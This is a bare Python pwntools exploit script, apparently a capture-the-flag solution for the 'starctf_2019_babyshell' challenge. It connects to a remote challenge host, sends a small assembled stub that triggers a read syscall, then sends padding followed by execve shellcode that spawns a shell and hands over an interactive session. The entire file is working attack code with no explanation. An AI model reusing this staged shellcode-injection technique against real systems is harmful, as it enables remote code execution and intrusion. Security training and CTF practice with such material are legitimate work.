# method two

from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./starctf_2019_babyshell"], env={"LD_PRELOAD":libc_path})
p = remote("node4.buuoj.cn", 25567)

context(os="linux", arch="amd64")

# sys_read
code = asm(
    """
    pop rdi;
    pop rdi;
    pop rdi;
    pop rdi;
    pop rdi;
    pop rdi;
    pop rdi;
    pop rdi;
    pop rdx;
    pop rdi;
    syscall
    """
)
p.send(code)

sleep(1)
# sys_execve
p.send(cyclic(0xc)+asm(shellcraft.sh()))

p.interactive()


